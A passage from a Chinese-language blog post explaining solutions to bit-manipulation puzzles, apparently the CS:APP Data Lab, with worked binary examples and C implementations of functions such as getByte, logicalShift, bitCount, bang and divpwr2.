&amp; 5 =4</code>，最大操作符数量为 8，等级为 1。根据对合律与对偶律可得<code>a&amp;b = ~(~(a&amp;b))=~(~a|~b)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitAnd - x&amp;y using only ~ and |</span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitAnd</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ~(~x | ~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h2><p>获取一个整数 x 中的第 n 个字节，n 的范围在<code>0 &lt;= n &lt;= 3</code>，例如<code>getByte(0x12345678,1) = 0x56</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 6，等级为 2。</p><p>可以利用位且操作符的性质，让其余位清 0 即可获取指定位的数值，例如<code>0x1234 &amp; 0x00ff= 0x34</code>，<code>0x1234 &amp; 0xff00 = 0x12</code>。可以让 0xff 左移 n*8 位就可以获取第 n 个字节，其余位都被清 0 了，之后再将获取到的字节右移回 n*8 位就可以了。由于无法使用乘号<code>*</code>，但是乘数刚好是 2 的倍数，因此可以使用左移代替乘法<code>n * 8 = n &lt;&lt; 3</code>。原理如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x=0x12345678, n=1</span></span><br><span class="line"><span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 0xff 左移 8*1 位</span></span><br><span class="line"><span class="number">0x000000ff</span></span><br><span class="line"><span class="number">0x0000ff00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 与原数进行位且运算</span></span><br><span class="line"><span class="number">0x00005600</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再右移 8*1 位</span></span><br><span class="line"><span class="number">0x00000056</span></span><br></pre></td></tr></table></figure><p>注意 C 语言里使用的是算术右移，即有符号数右移时符号位保持不变，符号位向右移动后正数在符号位补 0，负数补 1，因此若右移了一个负数，则被右移的位数上将都为 1，因此在最后还需要使用位且运算符只保留前 1 个字节。如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x=0x80000000, n=3</span></span><br><span class="line"><span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 0xff 左移 8*3 位</span></span><br><span class="line"><span class="number">0x000000ff</span></span><br><span class="line"><span class="number">0xff000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行位且运算</span></span><br><span class="line"><span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再右移 8*3 位</span></span><br><span class="line"><span class="number">0xffffff80</span> <span class="comment">// 由于是负数，符号位补 1，因此右移了很多 1</span></span><br><span class="line"><span class="number">0x000000ff</span> <span class="comment">// 进行位且运算将其余字节清 0</span></span><br><span class="line"><span class="number">0x00000080</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * getByte - Extract byte n from word x</span></span><br><span class="line"><span class="comment"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span></span><br><span class="line"><span class="comment"> *   Examples: getByte(0x12345678,1) = 0x56</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 6</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getByte</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ((x &amp; (<span class="number">0xff</span>&lt;&lt;(n&lt;&lt;<span class="number">3</span>))) &gt;&gt; (n&lt;&lt;<span class="number">3</span>)) &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h2><p>将整数 x 右移 n 位，n 的范围在<code>0 &lt;= n &lt;= 31</code>，例如<code>logicalShift(0x87654321,4) = 0x08765432</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 20，等级为 3。</p><p>在 C 语言里的位右移是算术右移，若右移的数是有符号数，则符号位正数补 0，负数补 1，例如 0x8000 右移 8 位得到 0xff80，而逻辑右移是不管符号位的，全部补 0。因此在执行算术右移以后，需要将被移动的位数全部清 0。将 0x1 左移 31 位以后就变成了 0x80000000(0b100000…)，这时再使用算术右移 n-1 位就可以将前 n-1 位指定为 1，再取反就可以将前 n-1 位清 0。原理如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000001</span></span><br><span class="line"><span class="comment">// 左移 31 位</span></span><br><span class="line"><span class="number">0x80000000</span></span><br><span class="line"><span class="comment">// 再右移 n-1 位，假设 n=5</span></span><br><span class="line"><span class="number">0xf8000000</span></span><br><span class="line"><span class="comment">// 变成 0b1111 1000 0000... 再取反</span></span><br><span class="line"><span class="number">0x07ffffff</span></span><br><span class="line"><span class="comment">// 变成 0b0000 0111 1111...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 假设原数为 0x80000000，即 0b1000 0000 0000...</span></span><br><span class="line"><span class="number">0x80000000</span></span><br><span class="line"><span class="comment">// 将原数算术右移 n=5 位，变成 0b1111 1100 0000...</span></span><br><span class="line"><span class="number">0xfc000000</span></span><br><span class="line"><span class="comment">// 再与前面得到的 0x07ffffff 位且运算，前 5 位被清零</span></span><br><span class="line"><span class="number">0x04000000</span></span><br><span class="line"><span class="comment">// 即可得到逻辑位移的结果</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">logicalShift</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> one = <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; ~(((one &lt;&lt; <span class="number">31</span>) &gt;&gt; n) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h2><p>获得整数 v 中二进制 1 的个数，例如<code>bitCount(5) = 2, bitCount(7) = 3</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 40，等级为 4。</p><p>这个题非常难，其原理就是将 32 位进行分组，每 2 位为一组，分别计算出每组 1 的数量，关于计算每组 1 的数量可以使用 010101…这样的掩码，先用位且运算计算每组低位 1 的数量，再将原数右移 1 位计算每组高位 1 的数量，相加即可得到每组 1 的数量，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设原数为 0x7a2d，其二进制如下</span></span><br><span class="line"><span class="number">0b01</span> <span class="number">11</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span> <span class="number">10</span> <span class="number">11</span> <span class="number">01</span></span><br><span class="line"><span class="comment">// 掩码如下</span></span><br><span class="line"><span class="number">0b01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span></span><br><span class="line"><span class="comment">// 进行且或运算得到每组低位 1 的数量得到结果 a</span></span><br><span class="line"><span class="number">0b01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将原数右移 1 位，这样高位就到了低位</span></span><br><span class="line"><span class="number">0b00</span> <span class="number">11</span> <span class="number">11</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">10</span></span><br><span class="line"><span class="comment">// 与掩码进行且或运算计算每组低位 1 的数量得到结果 b</span></span><br><span class="line"><span class="number">0b00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果 a 与结果 b 相加即可得到每组 1 的数量</span></span><br><span class="line"><span class="number">0b01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> +</span><br><span class="line"><span class="number">0b00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> =</span><br><span class="line"><span class="number">0b01</span> <span class="number">10</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">10</span> <span class="number">01</span></span><br></pre></td></tr></table></figure><p>之后再每 2 组相加得到每 4 组 1 的数量，相加可以使用掩码 00110011…，分别得到低两位 1 的数量与高两位 1 的数量，再相加，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 刚才计算每两位为一组的 1 的数量</span></span><br><span class="line"><span class="number">0b0110</span> <span class="number">0101</span> <span class="number">0001</span> <span class="number">1001</span></span><br><span class="line"><span class="comment">// 掩码如下</span></span><br><span class="line"><span class="number">0b0011</span> <span class="number">0011</span> <span class="number">0011</span> <span class="number">0011</span></span><br><span class="line"><span class="comment">// 进行且或运算得到每组低两位的 1 的数量得到结果 a</span></span><br><span class="line"><span class="number">0b0010</span> <span class="number">0001</span> <span class="number">0001</span> <span class="number">0001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将原数右移 2 位，这样高两位就到了低两位</span></span><br><span class="line"><span class="number">0b0001</span> <span class="number">1001</span> <span class="number">0100</span> <span class="number">0110</span></span><br><span class="line"><span class="comment">// 与掩码进行且或运算计算每 4 位一组的低两位 1 的数量得到结果 b</span></span><br><span class="line"><span class="number">0b0001</span> <span class="number">0001</span> <span class="number">0000</span> <span class="number">0001</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果 a 与结果 b 相加即可得到每组 1 的数量</span></span><br><span class="line"><span class="number">0b0010</span> <span class="number">0001</span> <span class="number">0001</span> <span class="number">0001</span> +</span><br><span class="line"><span class="number">0b0001</span> <span class="number">0001</span> <span class="number">0000</span> <span class="number">0001</span> =</span><br><span class="line"><span class="number">0b0011</span> <span class="number">0010</span> <span class="number">0001</span> <span class="number">0010</span></span><br></pre></td></tr></table></figure><p>之后再重复这样的操作，再分为 8 位一组计算，掩码为 0b0000111100001111…，再分为 16 位一组计算，掩码为 0b0000000011111111…，最后相加即可得到 32 位里 1 的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1&#x27;s in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitCount</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">0x55</span>|(<span class="number">0x55</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> mask_2bit = tmp|(tmp&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b01010101...</span></span><br><span class="line">    tmp = <span class="number">0x33</span>|(<span class="number">0x33</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> mask_4bit = tmp|(tmp&lt;&lt;<span class="number">16</span>); <span class="comment">// 0b001100110011...</span></span><br><span class="line">    tmp = <span class="number">0x0f</span>|(<span class="number">0x0f</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="type">int</span> mask_8bit = tmp|(tmp&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b0000111100001111...</span></span><br><span class="line">    <span class="type">int</span> mask_16bit = <span class="number">0xff</span>|(<span class="number">0xff</span>&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b0000000011111111...</span></span><br><span class="line">    <span class="type">int</span> mask_32bit = <span class="number">0xff</span>|(<span class="number">0xff</span>&lt;&lt;<span class="number">8</span>);  <span class="comment">// 00000000000000001111111111...</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> c = (v&amp;mask_2bit) + ((v&gt;&gt;<span class="number">1</span>)&amp;mask_2bit);  <span class="comment">// Each group with 2 bits.</span></span><br><span class="line">    c = (c&amp;mask_4bit) + ((c&gt;&gt;<span class="number">2</span>)&amp;mask_4bit);  <span class="comment">// Each group with 4 bits.</span></span><br><span class="line">    c = (c&amp;mask_8bit) + ((c&gt;&gt;<span class="number">4</span>)&amp;mask_8bit);  <span class="comment">// Each group with 8 bits.</span></span><br><span class="line">    c = (c&amp;mask_16bit) + ((c&gt;&gt;<span class="number">8</span>)&amp;mask_16bit);  <span class="comment">// Each group with 16 bits.</span></span><br><span class="line">    <span class="keyword">return</span> (c&amp;mask_32bit) + ((c&gt;&gt;<span class="number">16</span>)&amp;mask_32bit);  <span class="comment">// Only one group with 32 bits.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><p>不使用非运算符计算出<code>!x</code>，例如<code>bang(3) = 0, bang(0) = 1</code>。允许的操作符为<code>~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 12，等级为 4。</p><p>非运算符的作用非常简单，就是 0 返回 1，非 0 返回 0，所以重点就需要判断输入的数是否是 0。关于判断是否为 0 有两种方法，一种是将二进制位所有高位的 1 全部右移到低位，直到只剩下 1 个二进制位为止，直接判断该二进制是否为 0 即可，如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设原数 x 为 0x18</span></span><br><span class="line"><span class="number">0b00011000</span></span><br><span class="line"><span class="comment">// 右移一半(4 位)</span></span><br><span class="line"><span class="number">0b00000001</span></span><br><span class="line"><span class="comment">// 与原数做位或运算得到结果 a</span></span><br><span class="line"><span class="number">0b00011001</span></span><br><span class="line"><span class="comment">// 再将 a 右移一半(2 位)</span></span><br><span class="line"><span class="number">0b00000110</span></span><br><span class="line"><span class="comment">// 与 a 做位或运算得到结果 b</span></span><br><span class="line"><span class="number">0b00011111</span></span><br><span class="line"><span class="comment">// 再将 b 右移一半(1 位)</span></span><br><span class="line"><span class="number">0b00001111</span></span><br><span class="line"><span class="comment">// 与 b 做位或运算得到结果 c</span></span><br><span class="line"><span class="number">0b00011111</span></span><br><span class="line"><span class="comment">// 取 c 的最后一位就可以判断原数 x 是否含有 1</span></span><br></pre></td></tr></table></figure><p>另一种方法就是利用 0 的补码的特殊性质。计算补码使用的公式为 <code>~x+1</code>，而除了 0 和 0x80000000 以外其他数使用该公式都会得到其相反数，最高位符号位总是不同。而 0 和 0x80000000 这两个数计算出来的则是他们本身：如果要计算 0 的补码，就需要计算<code>~0+1</code>，而~0 的值是 0xffffffff，如果再加 1 则会溢出，变成 0x0，所以 0 的补码还是 0，最高位也是 0，而 0x80000000 的补码最高位还是 1，因此就可以通过比较<code>x</code> 与<code>~x+1</code>的符号位是否是 1 来判断 <code>x</code> 是否是 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; <span class="number">31</span>) | ((~x + <span class="number">0x1</span>) &gt;&gt; <span class="number">31</span>)) + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Two’s-Complement-Arithmetic"><a href="#Two’s-Complement-Arithmetic" class="headerlink" title="Two’s Complement Arithmetic"></a>Two’s Complement Arithmetic</h1><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>返回最小的补码整数。限制的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>。最大操作符数目为 4。等级为 1。最小的补码整数为 0x80000000。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h2><p>判断一个数 x 是否可以用 n 位补码表示，其中<code>1 &lt;= n &lt;= 32</code>。例如<code>fitsBits(5,3) = 0, fitsBits(-4,3) = 1</code>。允许使用的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>。最大操作符数量为 15。等级为 2。</p><p>此题化简一下就是需要判断：</p><ol><li>如果是正数且 x 的第 n 位为 0，那么就可以用 n 位补码表示。</li><li>如果是负数且 x 的第 n 位为 1，那么就可以用 n 位补码表示。</li></ol><p>其原理为：如果要用 n 位的补码表示，那么所表示出来的补码第 n 位必须作为符号位，如果原码第 n 位与其符号位不相同，那么就需要 n+1 位补码才能表示。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x5</span></span><br><span class="line"><span class="number">0b0000</span>..<span class="number">.0101</span></span><br><span class="line"><span class="comment">// 其补码为</span></span><br><span class="line"><span class="number">0b0000</span>..<span class="number">.0101</span></span><br><span class="line"><span class="comment">// 如果要用 3 位补码表示那么表示出的补码第 3 位必须为 0，但是 0x5 的原码第 3 为是 1，所以至少需要 4 位 0b0101 才能表示 0x5。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -0x4</span></span><br><span class="line"><span class="number">0b1000</span>..<span class="number">.0100</span></span><br><span class="line"><span class="comment">// 其补码为</span></span><br><span class="line"><span class="number">0b1111</span>..<span class="number">.1100</span></span><br><span class="line"><span class="comment">// 补码的第 3 位是 1，正好可以代表符号位，因此可以用 3 为补码 0b100 代表 -4。</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an</span></span><br><span class="line"><span class="comment"> *  n-bit, two&#x27;s complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fitsBits</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">     <span class="type">int</span> isNeg = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">     <span class="type">int</span> shift = n + (~<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> (!(x &gt;&gt; shift) &amp; !isNeg) | (!(~x &gt;&gt; shift) &amp; isNeg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h2><p>实现计算 x 除以 2 的 n 次方，其中<code>0 &lt;= n &lt;= 30</code>，向 0 取整，例如<code>divpwr2(15,1) = 7, divpwr2(-33,4) = -2</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 15，等级为 2。</p><p>如果是正数的话右移 n 位就是除以 2 的 n 次方，但是对负数并不适用，由于需要向 0 取整，而移位运算都是向下取整，因此就需要给负数添加一个补充值：$2^n-1$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">divpwr2</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> comple = (<span class="number">1</span>&lt;&lt;n) + (~<span class="number">0</span>);  <span class="comment">// 2^n - 1</span></span><br><span class="line">    <span class="keyword">return</span> (x + ((x &gt;&gt; <span class="number">31</span>) &amp; comple)) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>返回 x 的相反数，例如<code>negate(1) = -1</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 5，等级为 2。前面提到过，使用计算补码的公式即可得到一个数的相反数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ~x + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h2><p>判断一个数是否为正数，例如 <code>isPositive(-1) = 0</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 8，等级为 3。首先需要使用<code>!x</code> 判断是否为 0，之后就可以判断符号位是否为 1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 